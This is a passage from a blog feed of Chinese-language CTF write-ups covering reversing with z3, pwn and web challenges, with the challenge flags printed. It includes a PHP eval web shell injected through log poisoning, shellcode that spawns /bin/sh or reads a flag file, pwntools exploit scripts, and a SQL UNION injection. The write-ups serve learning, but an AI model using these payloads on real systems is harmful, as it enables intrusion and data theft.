class="built_in">range</span>(<span class="number">0xC0</span>, <span class="number">0xD0</span>):</span><br><span class="line">    mem[addr] = mem[<span class="number">0x1E</span>] + <span class="number">1</span>  <span class="comment"># Using indexed addressing</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Return to main execution</span></span><br><span class="line"><span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">memory[<span class="number">0x30</span>] = <span class="number">0</span>                 <span class="comment"># 将内存地址0x30设置为0</span></span><br><span class="line">subroutine_8365()                <span class="comment"># 调用子程序0x8365</span></span><br><span class="line">memory[<span class="number">0x033B</span>] = <span class="number">0</span>               <span class="comment"># 初始化内存地址0x033B为0</span></span><br><span class="line">subroutine_84C5()                <span class="comment"># 调用子程序0x84C5</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 主循环</span></span><br><span class="line">loop_start:</span><br><span class="line">    memory[<span class="number">0x033B</span>] = value_from_somewhere  <span class="comment"># 将某个值赋值给0x033B</span></span><br><span class="line">    <span class="comment"># 根据0x033B的值执行不同操作</span></span><br><span class="line">    <span class="keyword">if</span> memory[<span class="number">0x033B</span>] == <span class="number">0x80</span>:</span><br><span class="line">        memory[<span class="number">0x033B</span>] = <span class="number">0x74</span>  <span class="comment"># t</span></span><br><span class="line">    <span class="keyword">elif</span> memory[<span class="number">0x033B</span>] == <span class="number">0x40</span>:</span><br><span class="line">        memory[<span class="number">0x033B</span>] = <span class="number">0x75</span>  <span class="comment">#u</span></span><br><span class="line">    <span class="keyword">elif</span> memory[<span class="number">0x033B</span>] == <span class="number">0x20</span>:</span><br><span class="line">        memory[<span class="number">0x033B</span>] = <span class="number">0x61</span> <span class="comment">#a</span></span><br><span class="line">    <span class="keyword">elif</span> memory[<span class="number">0x033B</span>] == <span class="number">0x10</span>:</span><br><span class="line">        memory[<span class="number">0x033B</span>] = <span class="number">0x6E</span> <span class="comment">#n</span></span><br><span class="line">    <span class="keyword">elif</span> memory[<span class="number">0x033B</span>] == <span class="number">0x02</span>:</span><br><span class="line">        memory[<span class="number">0x033B</span>] = <span class="number">0x6C</span> <span class="comment">#l</span></span><br><span class="line">    <span class="keyword">elif</span> memory[<span class="number">0x033B</span>] == <span class="number">0x01</span>:</span><br><span class="line">        memory[<span class="number">0x033B</span>] = <span class="number">0x69</span> <span class="comment">#i</span></span><br><span class="line">    <span class="keyword">elif</span> memory[<span class="number">0x033B</span>] == <span class="number">0x08</span>:</span><br><span class="line">        memory[<span class="number">0x033B</span>] = <span class="number">0x6E</span> <span class="comment">#n</span></span><br><span class="line">    <span class="keyword">elif</span> memory[<span class="number">0x033B</span>] == <span class="number">0x04</span>:</span><br><span class="line">        memory[<span class="number">0x033B</span>] = <span class="number">0x68</span> <span class="comment">#h</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># 如果没有匹配的值，继续循环</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 将值写入内存并增加索引</span></span><br><span class="line">    memory[<span class="number">0x300</span> + memory[<span class="number">0x30</span>]] = memory[<span class="number">0x033B</span>])  <span class="comment"># 写入内存</span></span><br><span class="line">    memory[<span class="number">0x30</span>] += <span class="number">1</span>                              <span class="comment"># 递增0x30地址值</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 结束条件：当 memory[0x30] 大于等于16时，跳出循环</span></span><br><span class="line">    <span class="keyword">if</span> memory[<span class="number">0x30</span>] &gt;= <span class="number">0x10</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">some_check...</span><br><span class="line"><span class="comment"># 输出部分</span></span><br><span class="line"><span class="keyword">if</span> memory[<span class="number">0x30</span>] &gt;= <span class="number">0x10</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Correct! ISITDTU&#123;...&#125;&quot;</span>)  <span class="comment"># 输出正确的结果</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    jump_to_start                   <span class="comment"># 否则返回到开始位置或重启逻辑</span></span><br><span class="line">     </span><br></pre></td></tr></table></figure><p>The check part is a simple equality check，use z3 to solve</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">table = [<span class="number">0x74</span>,<span class="number">0x75</span>,<span class="number">0x61</span>,<span class="number">0x6e</span>,<span class="number">0x6c</span>,<span class="number">0x69</span>,<span class="number">0x6e</span>,<span class="number">0x68</span>]</span><br><span class="line"><span class="comment"># &#x27;tuanlinh&#x27;</span></span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line">a = [Int(<span class="string">f&#x27;a[<span class="subst">&#123;i&#125;</span>]&#x27;</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>)]</span><br><span class="line"><span class="comment"># a = [0]*16</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    s.add(Or(a[i]==<span class="number">0x74</span>, a[i]==<span class="number">0x75</span>, a[i]==<span class="number">0x61</span>, a[i]==<span class="number">0x6e</span>, a[i]==<span class="number">0x6c</span>, a[i]==<span class="number">0x69</span>, a[i]==<span class="number">0x68</span>))</span><br><span class="line"></span><br><span class="line">s.add(a[<span class="number">0</span>]+a[<span class="number">1</span>]+a[<span class="number">2</span>] == <span class="number">0x14A</span>)</span><br><span class="line">s.add(a[<span class="number">1</span>]+a[<span class="number">2</span>]+a[<span class="number">3</span>] == <span class="number">0x144</span>)</span><br><span class="line">s.add(a[<span class="number">2</span>]+a[<span class="number">3</span>]+a[<span class="number">4</span>] == <span class="number">0x13b</span>)</span><br><span class="line">s.add(a[<span class="number">3</span>]+a[<span class="number">4</span>]+a[<span class="number">5</span>] == <span class="number">0x143</span>)</span><br><span class="line">s.add(a[<span class="number">4</span>]+a[<span class="number">5</span>]+a[<span class="number">6</span>] == <span class="number">0x143</span>)</span><br><span class="line">s.add(a[<span class="number">5</span>]+a[<span class="number">6</span>]+a[<span class="number">7</span>] == <span class="number">0x13f</span>)</span><br><span class="line">s.add(a[<span class="number">6</span>]+a[<span class="number">7</span>]+a[<span class="number">8</span>] == <span class="number">0x142</span>)</span><br><span class="line">s.add(a[<span class="number">7</span>]+a[<span class="number">8</span>]+a[<span class="number">9</span>] == <span class="number">0x13d</span>)</span><br><span class="line">s.add(a[<span class="number">8</span>]+a[<span class="number">9</span>]+a[<span class="number">10</span>] == <span class="number">0x143</span>)</span><br><span class="line">s.add(a[<span class="number">9</span>]+a[<span class="number">10</span>]+a[<span class="number">11</span>] == <span class="number">0x13f</span>)</span><br><span class="line">s.add(a[<span class="number">10</span>]+a[<span class="number">11</span>]+a[<span class="number">12</span>] == <span class="number">0x14A</span>)</span><br><span class="line">s.add(a[<span class="number">11</span>]+a[<span class="number">12</span>]+a[<span class="number">13</span>] == <span class="number">0x151</span>)</span><br><span class="line">s.add(a[<span class="number">12</span>]+a[<span class="number">13</span>]+a[<span class="number">14</span>] == <span class="number">0x14A</span>)</span><br><span class="line">s.add(a[<span class="number">13</span>]+a[<span class="number">14</span>]+a[<span class="number">15</span>] == <span class="number">0x144</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> s.check() == sat:</span><br><span class="line">    mol = s.model()</span><br><span class="line">    flag = [mol.<span class="built_in">eval</span>(i).as_long() <span class="keyword">for</span> i <span class="keyword">in</span> a]</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">bytes</span>(flag))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;unsat&#x27;</span>)</span><br><span class="line"><span class="comment"># b&#x27;tuanlinhlinhtuan&#x27;</span></span><br></pre></td></tr></table></figure><p>patch the mem[0x30] to 0x10, and patch the mem[0x300] as ‘tuanlinhlinhtuan’ , you can get flag</p><h3 id="TLS-callbacks"><a href="#TLS-callbacks" class="headerlink" title="TLS_callbacks"></a>TLS_callbacks</h3><p>TLS——Thread-local-storage callback，which is used by the application. Such a callback is called by the system before the application entry point.</p><p>Here are some recommendations about what could we do to avoid such jumpover breakpoint bad surprises:</p><ul><li><strong>Run the application in a confined virtual environment</strong></li><li>Look for TLS callbacks in the entry point list before launching the debugger</li><li>Configure the debugger to suspend as soon as the process is created(ass Debugger, debugger options. Stop on options)</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;ISITDTU-CTF-2024-Reverse&quot;&gt;&lt;a href=&quot;#ISITDTU-CTF-2024-Reverse&quot; class=&quot;headerlink&quot; title=&quot;ISITDTU CTF 2024 | Reverse&quot;&gt;&lt;/a&gt;ISITDTU CTF </summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>DIE-AIO</title>
    <link href="https://github.com/xyy9233/xyy9233.github.io.git/2024/10/22/pwn%E2%9C%8C%E7%9A%84%E5%85%A8%E6%A0%88%E5%B0%8F%E6%B8%B8%E6%88%8F/"/>
    <id>https://github.com/xyy9233/xyy9233.github.io.git/2024/10/22/pwn%E2%9C%8C%E7%9A%84%E5%85%A8%E6%A0%88%E5%B0%8F%E6%B8%B8%E6%88%8F/</id>
    <published>2024-10-21T16:00:00.000Z</published>
    <updated>2024-10-30T11:41:58.566Z</updated>
    
    <content type="html"><![CDATA[<p>在pwn爹和web✌的冷嘲热讽下，开始写AIO：</p><p>zip伪加密：</p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20241021103222727.png" alt="image-20241021103222727"></p><h3 id="第一关"><a href="#第一关" class="headerlink" title="第一关"></a>第一关</h3><p>‘兔子’、‘36’好耳熟的几个词，SSTV，虚拟话筒坏了而且似乎虚拟硬件缺失和冲突了 （想骂电脑自带的杀毒方式）</p><p><img src="https://xyy9233.oss-cn-beijing.aliyuncs.com/hexoblog/b3cb02eff1077c3e5d36a5ff71cc2e59.png" alt="img"></p><p>音符解密，key &#x3D; DIE2024</p><p><img src="https://xyy9233.oss-cn-beijing.aliyuncs.com/hexoblog/image-20241021110949696.png" alt="image-20241021110949696"></p><p>flag1{Musc_1s_@ll_0f_CTF}</p><h3 id="第二关"><a href="#第二关" class="headerlink" title="第二关"></a>第二关</h3><p><img src="https://xyy9233.oss-cn-beijing.aliyuncs.com/hexoblog/7de5e24b2fe64240d43f0ee272df0223.png" alt="img"></p><p>预期应该是共模攻击？似乎密码手有非预期解（其中e1太小了</p><p>密码手发群里了，pwn爹给我发了</p><p>flag2{Wh1t?D0n‘t_y05_kN0vv_th3_R3@}</p><h3 id="第三关"><a href="#第三关" class="headerlink" title="第三关"></a>第三关</h3><p>日志上传</p><p>似乎是改成POST方式，&#x2F;?file&#x3D;&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</p><p>UA加&lt;?php phpinfo();?&gt;</p><p>&lt;?php @eval($_POST[1]);?&gt;</p><p><img src="https://xyy9233.oss-cn-beijing.aliyuncs.com/hexoblog/c6481b30e89911c5799101648dd201e4.png" alt="img"></p><p>绷不住了，孺子不可教</p><p>flag3{Y03_s5y_4_y0ur_w3b_15_v53y_g00d}</p><h3 id="第四关"><a href="#第四关" class="headerlink" title="第四关"></a>第四关</h3><p><img src="https://xyy9233.oss-cn-beijing.aliyuncs.com/hexoblog/image-20241021180357487.png" alt="image-20241021180357487"></p><p><img src="https://xyy9233.oss-cn-beijing.aliyuncs.com/hexoblog/image-20241021231951066.png" alt="image-20241021231951066"></p><p><img src="https://xyy9233.oss-cn-beijing.aliyuncs.com/hexoblog/image-20241021232352653.png" alt="image-20241021232352653"></p><p>这里是用seccomp()开启的沙箱，和我们上面分析的结果一样，都是允许调用open,read,write,exit</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&#x27;./ohh!&#x27;</span>) </span><br><span class="line"><span class="comment">#r = remote(&quot;die.tj.cn&quot;,10000)</span></span><br><span class="line"></span><br><span class="line">shellcode = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    xor rax, rax</span></span><br><span class="line"><span class="string">    mov rdi, 0x68732f6e69622f2f </span></span><br><span class="line"><span class="string">    push rdi</span></span><br><span class="line"><span class="string">    mov rdi, rsp</span></span><br><span class="line"><span class="string">    xor rdx, rdx </span></span><br><span class="line"><span class="string">    mov al, 59   </span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)<span class="comment">#shellcode写错了，orz可能还是没太理解</span></span><br><span class="line"></span><br><span class="line">payload = shellcode.ljust(<span class="number">0x200</span>, <span class="string">b&#x27;\x90&#x27;</span>) </span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;please give me your shellcode:&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">shellcode = asm(</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov rax, 0x67616c662f2e</span></span><br><span class="line"><span class="string">push rax</span></span><br><span class="line"><span class="string">mov rsi, 0</span></span><br><span class="line"><span class="string">mov rdx, 0</span></span><br><span class="line"><span class="string">mov rdi, rsp</span></span><br><span class="line"><span class="string">push 0x2</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rdi, 3</span></span><br><span class="line"><span class="string">mov rsi, 0x114514000LL</span></span><br><span class="line"><span class="string">mov rdx, 0x100</span></span><br><span class="line"><span class="string">push 0x0</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rdi, 1</span></span><br><span class="line"><span class="string">mov rsi, 0x114514000LL</span></span><br><span class="line"><span class="string">mov rdx, 0x100</span></span><br><span class="line"><span class="string">push 0x1</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>, arch=<span class="string">&quot;amd64&quot;</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>flag4{N0_9wn_n0_L1fe}</p><h3 id="第五关"><a href="#第五关" class="headerlink" title="第五关"></a>第五关</h3><p>直接读的flag，可疑字符串</p><p><img src="https://xyy9233.oss-cn-beijing.aliyuncs.com/hexoblog/image-20241022132233641.png" alt="image-20241022132233641"></p><p><img src="https://xyy9233.oss-cn-beijing.aliyuncs.com/hexoblog/image-20241022132255957.png" alt="image-20241022132255957"></p><p>flag5{Ur_Go0d_@T_t3tr15!!!}</p><h3 id="第六关"><a href="#第六关" class="headerlink" title="第六关"></a>第六关</h3><p>TJUCTF{Y0u_R_t4e_de5t1n3d_0n1}</p><p>？直接显示的么？</p><h3 id="pwn爹的图片："><a href="#pwn爹的图片：" class="headerlink" title="pwn爹的图片："></a>pwn爹的图片：</h3><p>密码：st@y_t5u3_t0_t7e_m1ss!on</p><p># ststeghide  extract -sf die.jpg</p><p>TJUCTF{Y0u_R_t4e_de5t1n3d_0n1}</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;在pwn爹和web✌的冷嘲热讽下，开始写AIO：&lt;/p&gt;
&lt;p&gt;zip伪加密：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-2024102110322272</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Newstar2024 | Reverse &amp; 别的方向入门题</title>
    <link href="https://github.com/xyy9233/xyy9233.github.io.git/2024/10/20/Newstar%EF%BC%81/"/>
    <id>https://github.com/xyy9233/xyy9233.github.io.git/2024/10/20/Newstar%EF%BC%81/</id>
    <published>2024-10-19T16:00:00.000Z</published>
    <updated>2024-10-30T11:43:04.226Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Newstar2024"><a href="#Newstar2024" class="headerlink" title="Newstar2024"></a>Newstar2024</h1><h2 id="Week1"><a href="#Week1" class="headerlink" title="Week1"></a>Week1</h2><h3 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h3><h4 id="begin"><a href="#begin" class="headerlink" title="begin"></a>begin</h4><p>打开IDA</p><p><img src="https://xyy9233.oss-cn-beijing.aliyuncs.com/hexoblog/image-20241005124925519.png" alt="image-20241005124925519"></p><p><img src="https://xyy9233.oss-cn-beijing.aliyuncs.com/hexoblog/image-20241005125051687.png" alt="image-20241005125051687"></p><p><strong>flag{Mak3_aN_3Ff0rt_tO_5eArcH_F0r_th3_f14g_C0Rpse}</strong></p><h4 id="base64"><a href="#base64" class="headerlink" title="base64"></a>base64</h4><p>密文告了，表也换了，扔cyberchef里ok</p><p><img src="https://xyy9233.oss-cn-beijing.aliyuncs.com/hexoblog/image-20241005125142014.png" alt="image-20241005125142014"></p><p><strong>flag{y0u_kn0w_base64_well}</strong></p><h4 id="Simple-encryption"><a href="#Simple-encryption" class="headerlink" title="Simple_encryption"></a>Simple_encryption</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">flag = [ <span class="number">0x47</span>, <span class="number">0x95</span>, <span class="number">0x34</span>, <span class="number">0x48</span>, <span class="number">0xA4</span>, <span class="number">0x1C</span>, <span class="number">0x35</span>, <span class="number">0x88</span>, <span class="number">0x64</span>, <span class="number">0x16</span>, <span class="number">0x88</span>, <span class="number">0x07</span>, <span class="number">0x14</span>, <span class="number">0x6A</span>, <span class="number">0x39</span>, <span class="number">0x12</span>, <span class="number">0xA2</span>, <span class="number">0x0A</span>, <span class="number">0x37</span>, <span class="number">0x5C</span>, <span class="number">0x07</span>, <span class="number">0x5A</span>, <span class="number">0x56</span>, <span class="number">0x60</span>, <span class="number">0x12</span>, <span class="number">0x76</span>, <span class="number">0x25</span>, <span class="number">0x12</span>, <span class="number">0x8E</span>, <span class="number">0x28</span>, <span class="number">0x00</span>, <span class="number">0x00</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">    <span class="keyword">if</span> i%<span class="number">3</span>==<span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">chr</span>(flag[i]+<span class="number">0x1f</span>),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> i%<span class="number">3</span> ==<span class="number">1</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">chr</span>(flag[i]-<span class="number">0x29</span>),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">chr</span>(flag[i]^<span class="number">0x55</span>),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">     </span><br><span class="line"><span class="comment"># flag&#123;IT_15_R3Al1y_V3Ry-51Mp1e&#125;</span></span><br></pre></td></tr></table></figure><h4 id="ezAndroidStudy"><a href="#ezAndroidStudy" class="headerlink" title="ezAndroidStudy"></a>ezAndroidStudy</h4><p><img src="https://xyy9233.oss-cn-beijing.aliyuncs.com/hexoblog/image-20241005120848944.png" alt="image-20241005120848944"></p><p><img src="https://xyy9233.oss-cn-beijing.aliyuncs.com/hexoblog/image-20241005120912817.png" alt="image-20241005120912817"></p><p><img src="https://xyy9233.oss-cn-beijing.aliyuncs.com/hexoblog/image-20241005124636944.png" alt="image-20241005124636944"></p><p><img src="https://xyy9233.oss-cn-beijing.aliyuncs.com/hexoblog/image-20241005121101080.png" alt="image-20241005121101080"></p><p>part5,用IDA打开就是</p><p><strong>flag{Y0u_@r4_900d_andr01d_r4V4rs4r}</strong></p><h4 id="ez-debug"><a href="#ez-debug" class="headerlink" title="ez_debug"></a>ez_debug</h4><p>动调，</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">key = <span class="string">&quot;ATRI&quot;</span></span><br><span class="line">flag = [  <span class="number">0x30</span>, <span class="number">0x2F</span>, <span class="number">0x24</span>, <span class="number">0x39</span>, <span class="number">0x2D</span>, <span class="number">0x3A</span>, <span class="number">0x75</span>, <span class="number">0x2B</span>, <span class="number">0x09</span>, <span class="number">0x22</span>, <span class="number">0x37</span>, <span class="number">0x6D</span>, <span class="number">0x09</span>, <span class="number">0x24</span>, <span class="number">0x75</span>, <span class="number">0x31</span>, <span class="number">0x32</span>, <span class="number">0x1C</span>, <span class="number">0x05</span>, <span class="number">0x01</span>,<span class="number">0x12</span>,<span class="number">0x26</span>,<span class="number">0x27</span>,<span class="number">0x2b</span>,<span class="number">0x6f</span>,<span class="number">0x3e</span>]</span><br><span class="line"></span><br><span class="line">decrypted_flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">    decrypted_flag += <span class="built_in">chr</span>(<span class="number">0x17</span>^flag[i] ^ <span class="built_in">ord</span>(key[i % <span class="built_in">len</span>(key)]))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Decrypted flag:&quot;</span>, decrypted_flag)</span><br><span class="line"><span class="comment"># flag&#123;y0u_ar3_g0od_@_Debu9&#125;</span></span><br></pre></td></tr></table></figure><h3 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h3><h4 id="Real-Login"><a href="#Real-Login" class="headerlink" title="Real Login"></a>Real Login</h4><p>打开输入密码。得到flag</p><h4 id="Game"><a href="#Game" class="headerlink" title="Game"></a>Game</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&quot;&quot;</span>, )</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;pls input you num: &quot;</span>,<span class="string">b&#x27;10&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h4 id="overwrite"><a href="#overwrite" class="headerlink" title="overwrite"></a>overwrite</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&quot;&quot;</span>, )</span><br><span class="line">p.sendlineafter(<span class="string">&quot;pls input the length you want to readin: &quot;</span>,<span class="string">b&#x27;-100&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;pls input want you want to say: &quot;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span>+<span class="string">b&#x27;1145140&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>gdb</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&quot;&quot;</span>,)</span><br><span class="line">p.sendafter(<span class="string">&quot;Input your encrypted data: &quot;</span>,<span class="string">b&#x27;\x5d\x1d\x43\x55\x53\x45\x57\x45&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h3><h4 id="兑换码"><a href="#兑换码" class="headerlink" title="兑换码"></a>兑换码</h4><p><img src="https://xyy9233.oss-cn-beijing.aliyuncs.com/hexoblog/%E8%8D%A3%E8%8A%B1%E4%B8%8E%E7%82%8E%E6%97%A5%E4%B9%8B%E9%80%94-%E4%BF%AE%E5%A4%8D%E9%AB%98%E5%AE%BD.png" alt="荣花与炎日之途-修复高宽"></p><h4 id="Labyrinth"><a href="#Labyrinth" class="headerlink" title="Labyrinth"></a>Labyrinth</h4><p><img src="https://xyy9233.oss-cn-beijing.aliyuncs.com/hexoblog/image-20241005135810058.png" alt="image-20241005135810058"></p><p>flag{e33bb7a1-ac94-4d15-8ff7-fd8c88547b43}</p><h4 id="WhereIsFlag"><a href="#WhereIsFlag" class="headerlink" title="WhereIsFlag"></a>WhereIsFlag</h4><p><img src="https://xyy9233.oss-cn-beijing.aliyuncs.com/hexoblog/image-20241005145605587.png" alt="image-20241005145605587"></p><h4 id="pleasingMusic"><a href="#pleasingMusic" class="headerlink" title="pleasingMusic"></a>pleasingMusic</h4><p><img src="https://xyy9233.oss-cn-beijing.aliyuncs.com/hexoblog/1728116382763-74e556f3-5f89-4aca-ab94-97c5f7a73543.png" alt="img"></p><p>flag{ez_morse_code}</p><h4 id="decompress"><a href="#decompress" class="headerlink" title="decompress"></a>decompress</h4><p><img src="https://xyy9233.oss-cn-beijing.aliyuncs.com/hexoblog/1728123193483-89c5cfcd-344a-4daf-967a-b8f538c093c5.png" alt="img"></p><p>密码：xtr4m</p><p> flag{U_R_th3_ma5ter_0f_dec0mpress}</p><h3 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h3><h4 id="headach3"><a href="#headach3" class="headerlink" title="headach3"></a>headach3</h4><p>f12，网络</p><h4 id="会赢吗"><a href="#会赢吗" class="headerlink" title="会赢吗"></a>会赢吗</h4><p><img src="https://xyy9233.oss-cn-beijing.aliyuncs.com/hexoblog/image-20241005150146703.png" alt="image-20241005150146703"></p><!-- flag第一部分：ZmxhZ3tXQTB3，开始你的新学期吧！:/4cqu1siti0n --><p><img src="https://xyy9233.oss-cn-beijing.aliyuncs.com/hexoblog/image-20241005151232163.png" alt="image-20241005151232163"></p><p><img src="https://xyy9233.oss-cn-beijing.aliyuncs.com/hexoblog/image-20241005151744333.png" alt="image-20241005151744333"></p><p><img src="https://xyy9233.oss-cn-beijing.aliyuncs.com/hexoblog/321edf3441ad66dd35dc2382150a8727.png" alt="img"></p><h4 id="智械危机"><a href="#智械危机" class="headerlink" title="智械危机"></a>智械危机</h4><p><img src="https://xyy9233.oss-cn-beijing.aliyuncs.com/hexoblog/image-20241005154808486.png" alt="image-20241005154808486"></p><h4 id="谢谢皮蛋"><a href="#谢谢皮蛋" class="headerlink" title="谢谢皮蛋"></a>谢谢皮蛋</h4><p>-1 union select 1,group_concat(id,’:’,des,’:’,value) from 